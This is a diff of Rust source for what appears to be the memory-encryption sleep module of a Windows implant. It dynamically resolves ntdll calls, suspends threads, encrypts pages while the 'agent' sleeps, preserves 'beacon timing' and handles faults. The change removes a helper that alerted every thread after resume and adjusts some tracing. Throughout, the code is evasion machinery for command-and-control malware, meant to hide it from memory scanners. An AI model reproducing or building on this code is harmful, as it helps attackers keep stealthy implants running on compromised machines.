@@ -75,7 +75,6 @@ type NtQueryInformationThreadFn =
     extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
 
 type NtQuerySystemInformationFn = extern "system" fn(u32, *mut c_void, u32, *mut u32) -> i32;
-type NtAlertThreadByIdFn = extern "system" fn(*mut c_void) -> i32;
 
 unsafe extern "system" {
     fn GetModuleHandleW(lpModuleName: *const u16) -> *mut c_void;
@@ -114,7 +113,6 @@ unsafe extern "system" {
     ) -> *mut c_void;
     fn GetTickCount64() -> u64;
     fn GetLastError() -> u32;
-    fn NtAlertThreadByThreadId(ThreadId: *mut c_void) -> i32;
 }
 
 #[derive(Clone, Copy, Default)]
@@ -429,9 +427,6 @@ fn watchdog_main(ntdll: (usize, usize)) {
                 ensure_decrypted(g);
             }
         }
-        // Re-sync every other thread's waits after the self-heal restore (the
-        // runtime may have lost its wake signal across the partial-resume).
-        thread_kick();
         if !wake.is_null() {
             unsafe {
                 let _ = SetEvent(wake);
@@ -497,59 +492,6 @@ fn resolve_ntdll() -> Option<(usize, usize)> {
 
 fn wstr(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(std::iter::once(0)).collect()
-}
-
-// Alert every thread in this process (except the caller) after a resume from the
-// encrypted window. Threads suspended inside kernel waits can lose their wake
-// signals across the suspend/resume cycle (empirically confirmed: a SetEvent at
-// partial-resume was consumed against the SUSPENDED waiter and never delivered, so
-// the agent task was never polled). An alert forces each alertable wait (tokio
-// condvar/alert parks, std park) to return spuriously, which the runtimes handle
-// correctly, re-syncing them onto fresh waits. Failures to alert an individual
-// thread are non-fatal (best-effort).
-fn thread_kick() {
-    let self_tid = unsafe { GetCurrentThreadId() };
-    let pid = unsafe { GetCurrentProcessId() };
-    let ntdll = unsafe { GetModuleHandleW(wstr("ntdll.dll").as_ptr()) };
-    if ntdll.is_null() {
-        return;
-    }
-    let alert = {
-        let p = unsafe { GetProcAddress(ntdll, b"NtAlertThreadByThreadId\0".as_ptr()) };
-        if p.is_null() {
-            return;
-        }
-        unsafe { core::mem::transmute::<*mut c_void, NtAlertThreadByIdFn>(p) }
-    };
-    let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
-    if snap.is_null() {
-        return;
-    }
-    let mut te: THREADENTRY32 = unsafe { core::mem::zeroed() };
-    te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
-    let mut n = 0usize;
-    let mut first = true;
-    loop {
-        let ok = unsafe {
-            if first {
-                Thread32First(snap, &mut te) != 0
-            } else {
-                Thread32Next(snap, &mut te) != 0
-            }
-        };
-        first = false;
-        if !ok {
-            break;
-        }
-        if te.th32OwnerProcessID == pid && te.th32ThreadID != self_tid {
-            let _ = unsafe { alert(te.th32ThreadID as *mut c_void) };
-            n += 1;
-        }
-    }
-    unsafe {
-        CloseHandle(snap);
-    }
-    trace_line("thread-kick", format_args!("n={n}"));
 }
 
 fn region_size_of(ptr: *mut c_void) -> usize {
@@ -1597,12 +1539,6 @@ fn run_cycle(
     // below, if any, runs with the runtime live.
     drop(slots);
     trace_line("resumed", format_args!("n={n}"));
-    // PARTIAL path leaves pages encrypted after resume; alert every other thread
-    // (see thread_kick) so any alertable wait that lost its signal across the
-    // suspend/resume cycle re-syncs onto a fresh wait.
-    if partial.is_some() {
-        thread_kick();
-    }
     // MIDWAKE remaining unencrypted sleep preserves beacon timing; the agent is
     // woken after the full interval by the caller.
     if let Some(s) = mid {
@@ -1814,7 +1750,7 @@ fn emit_partial(k: usize) {
 fn emit_partial(_k: usize) {}
 
 #[cfg(feature = "print_debug")]
-pub(crate) fn trace_init() {
+fn trace_init() {
     TRACE_T0.get_or_init(|| unsafe { GetTickCount64() });
     if !TRACE_HANDLE
         .load(core::sync::atomic::Ordering::Acquire)
@@ -1873,7 +1809,7 @@ fn emit_trace_init_failed(gle: u32) {
     }
 }
 #[cfg(not(feature = "print_debug"))]
-pub(crate) fn trace_init() {}
+fn trace_init() {}
 
 #[cfg(feature = "print_debug")]
 fn trace_now() -> u64 {
@@ -2054,12 +1990,6 @@ mod tests {
     fn windows_veh_fault_recovery() {
         // Serialize with the other memguard tests which also own the singleton.
         let _g = crate::memguard::TEST_LOCK.lock().unwrap();
-
-        // Initialize the trace machinery so the VEH handler's veh-recover/veh-miss
-        // lines land in memguard-trace.log (test CWD) instead of being invisible.
-        // The VEH handler writes through the same trace machinery and does NOT
-        // depend on watchdog_main having run.
-        super::trace_init();
 
         let mut guard = MemGuard::new().expect("memguard init");
 
